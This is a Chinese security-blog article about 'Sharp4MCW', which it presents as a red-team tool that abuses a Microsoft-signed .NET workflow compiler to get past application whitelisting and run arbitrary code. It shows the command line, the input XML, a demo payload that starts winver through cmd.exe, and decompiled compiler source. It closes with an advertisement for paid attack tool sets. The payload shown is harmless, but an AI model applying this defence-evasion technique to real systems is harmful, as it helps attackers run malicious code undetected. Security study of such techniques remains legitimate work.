---
title: .NET 一款具备签名用于绕过防护的工具
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247494833&idx=1&sn=75630c9db39746bec4e9b1e865776ede&chksm=fa59425ccd2ecb4aad4af5b46de00edef8d2ba83745a9c907926da7d2a05be9daa2f84ed1487&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-08-29
fetch_date: 2025-10-06T18:05:06.550812
---

# .NET 一款具备签名用于绕过防护的工具

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YicZ6eAemZ2Ty3hibrFXzOa39lRtpsR5cAdQP4LPwn7davMtOFee5DdYwGehY4E9ibwuV9TbIwWkbtGQ/0?wx_fmt=jpeg)

# .NET 一款具备签名用于绕过防护的工具

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他方面

02

基本介绍

Sharp4MCW 是红队活动中常用的一款强大工具，具备微软签名的白名单特性，能够有效绕过许多安全防护机制。攻击者可以利用此工具加载Shellcode或启动其他二进制文件，从而达到隐蔽执行恶意代码的目的。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YicZ6eAemZ2Ty3hibrFXzOa39BpsUIRN6ib7uDfCTLOiavyat4jJRzkskrV3ibztqQ2tO8PgrT5IpkPx9Q/640?wx_fmt=jpeg&from=appmsg)

03

使用方法

运行 Sharp4MCW.exe 时，可以通过以下命令行格式进行操作，通常需要两个参数，具体命令如下所示。

```
Sharp4MCW.exe Sharp4MCW.txt Sharp4MCW.foo
```

其中，Sharp4MCW.txt 是关联的 .NET 代码文件，而 Sharp4MCW.foo 是需要被编译的文件，这里的扩展名可以是任意名称。执行命令后成功启动本地winver.exe进程。如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicZ6eAemZ2Ty3hibrFXzOa39eTOicTOXKzibFqJBiaYsvcMh2ZE7X1pwibmtpLHEXgW9YSsw2h4rcBv6eg/640?wx_fmt=png&from=appmsg)

04

原理解析

在 Sharp4MCW.txt 中，代码文件 Sharp4MCW.foo 通过以下 XML 结构进行关联：

```
<files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
    <d2p1:string>Sharp4MCW.foo</d2p1:string>
</files>
```

在 Sharp4MCW.foo 文件中，可以嵌入 .NET 代码。例如下面的代码用于启动本地的 winver 进程

```
public class Sharp4MCW : SequentialWorkflowActivity {
    System.Diagnostics.Process.Start("cmd.exe", "/c winver");
}
```

Sharp4MCW 的工作原理主要依赖于 WorkflowCompiler 类来编译和执行代码。在这个过程中，WorkflowCompiler 类的 Compile 方法会接收编译参数和代码文件，并在独立的应用程序域中进行编译。编译完成后，代码会被加载并执行。

```
private static void Main(string[] args)
{
    if (args == null || args.Length != 2)
    {
        throw new ArgumentException(WrapperSR.GetString("InvalidArgumentsToMain"), "args");
    }
    CompilerInput compilerInput = Program.ReadCompilerInput(args[0]);
    WorkflowCompilerResults results = new WorkflowCompiler().Compile(
        MultiTargetingInfo.MultiTargetingUtilities.RenormalizeReferencedAssemblies(compilerInput.Parameters),
        compilerInput.Files);
    Program.WriteCompilerOutput(args[1], results);
}
```

接着，这段代码通过创建一个新的应用程序域，安全地编译和执行代码文件，实现了隔离和隐蔽的攻击载荷执行。如下所示。

```
public sealed class WorkflowCompiler
{
    public WorkflowCompilerResults Compile(WorkflowCompilerParameters parameters, params string[] files)
    {
        if (parameters == null)
        {
            throw new ArgumentNullException("parameters");
        }
        if (files == null)
        {
            throw new ArgumentNullException("files");
        }

        AppDomainSetup setupInformation = AppDomain.CurrentDomain.SetupInformation;
        setupInformation.LoaderOptimization = LoaderOptimization.MultiDomainHost;
        AppDomain appDomain = AppDomain.CreateDomain("CompilerDomain", null, setupInformation);

        WorkflowCompilerInternal workflowCompilerInternal = (WorkflowCompilerInternal)
            appDomain.CreateInstanceAndUnwrap(Assembly.GetExecutingAssembly().FullName, typeof(WorkflowCompilerInternal).FullName);

        WorkflowCompilerResults workflowCompilerResults = workflowCompilerInternal.Compile(parameters, files);

        if (!workflowCompilerResults.Errors.HasErrors)
        {
            workflowCompilerResults.CompiledAssembly = Assembly.Load(File.ReadAllBytes(workflowCompilerResults.PathToAssembly));
            workflowCompilerResults.PathToAssembly = null;
        }

        return workflowCompilerResults;
    }
}
```

综上，Sharp4MCW 是红队工具集中非常实用的一款工具，利用微软签名的特性，可以在红队活动中有效绕过安全防护，攻击者可以在不同场景下使用不同的攻击载荷，使其具有很高的适应性和隐蔽性。工具已经打包在星球，感兴趣的朋友可以加入自取。

05

推荐阅读

从漏洞分析到安全攻防，我们涵盖了.NET安全各个关键方面，为您呈现最新、最全面的.NET安全知识，下面是公众号发布的精华文章集合，推荐大家阅读！

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8TQhCZMggf71ffibqISJ8f5naPJacnjn0roDyxxnAibmuwDJq2p1GTBpicZhnM9o9gTIu9S9ia8Uqwtw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493952&idx=4&sn=db68011fb075c1d02268811163646b53&chksm=fa5947adcd2ecebbb1ca6659f289a5e344e37d1136fe0bd9272b5578e4c71bb19bb250e934d3&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOE2ogFoYIdqnYynqF6XyicI7XfRsWsn36wsCpKpAJcIQOicZUhbDJOe0w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488762&idx=1&sn=a5710927a6ba09b5c83adf616e2b12ae&chksm=fa5aba17cd2d330119d1ab2ce4b3a434274f0adf96729dbf8f04bef16c389565fc144f84d341&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOeP3ichLEiafhGiawd8mjkHYBalO37fN8QQkNdic1hjjY2Nvw2Bib6UvibDRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOjWgak8cI7Mic1wTt3YSKqsbLl9rPe0cF9WGtOEuiceLreTNtNVib6IKlw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxO8jJ97qqWlY6XR03DqSnutcHFYibDtVG5Y2wEaK4p2bzEicZblY4oQyGg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOe1viaia4aoFceunsUdIna4DPbmemW1EqlBMrovOoE6bdAFF3iaApxz5qA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)

06

欢迎加入.NET安全星球

为了更好地应对基于.NET技术栈的风险识别和未知威胁，dotNet安全矩阵星球从创建以来一直聚焦于.NET领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动.NET安全高质量的向前发展。 星球门票后期价格随着内容和质量的不断沉淀会适当提高，因此越早加入越好！

    目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最活跃的技术知识库之一，从.NET Framework到.NET Core，从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的安全指南和最佳实践。

星球汇聚了各行业安全攻防技术大咖，并且每日分享.NET安全技术干货以及交流解答各类技术等问题，社区中发布很多高质量的.NET安全资源，可以说市面上很少见，都是干货。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibzerwUbGOupPoJgYlZNMo1gg58eGoicPibjMBKkEo1zOia6zOyeupYasZZ9DTFvJVvzJQTEuhKrvTsA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58Ueoynsb0my3uzMAb7VwM5bgtnb4nbl4c9xdEjGraUXic6pO0p38xmWiaRQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOc2SogKzZ16SD7dpzF3v81kia4ZAx5QU5ibnNibEo8kZZSJgrficz4Ckxwg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

星球文化始终认为授人以鱼不如授人以渔！加入星球后可以跟星主和嘉宾们一对一提问交流，20+个专题栏目涵盖了点、线、面、体等知识面，助力师傅们快速成长！其中主题包括.NET Tricks、漏洞分析、内存马、代码审计、预编译、反序列化、webshell免杀、命令执行、C#工具库等等。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YiccvW0LwqSx3grm4bgM0fz01qCxrYGBR94wibZ7sk1zIO9DzCgviab9vmUic8qmvynXhSM8LxFhGG97w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

    我们倾力打造专刊、视频等配套学习资源，循序渐进的方式引导加深安全攻防技术提高以及岗位内推等等服务。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9XgicSeCfnDO0KyvDNdCZhG3pTSWHRekG0Wrp0FXyHO1mz9ia5uiaICjCmg5jIzx4ERLU8MjXWVSkCw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

我们还有一个会员专属的内部星球陪伴群，加入的成员可以通过在群里提出问题或参与论的方式来与其他成员交流思想和经验。此外还可以通过星球或者微信群私聊向我们进行提问，以获取帮助迅速解决问题。

为了助力大家在2024国家级hvv演练中脱颖而出，我们特别整理出了一套涵盖dotNet安全矩阵星球的八大.NET相关方向工具集。

```
.NET 免杀WebShell
.NET 反序列化漏洞
.NET 安全防御绕过
.NET 内网信息收集
.NET 本地权限提升
.NET 内网横向移动
.NET 目标权限维持
.NET 数据外发传输
```

这些阶段所涉及的工具集不仅代表了当前.NET安全领域的最前沿技术，更是每一位网络安全爱好者不可或缺的实战利器。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9ZQNibdZiazXl9zhxh3wB9n5LXcwJqbvQywJQLsckcGGV6NNWLITK1VkDV2CPeahvyUbPNPCRATEmA/640?wx_fmt=o...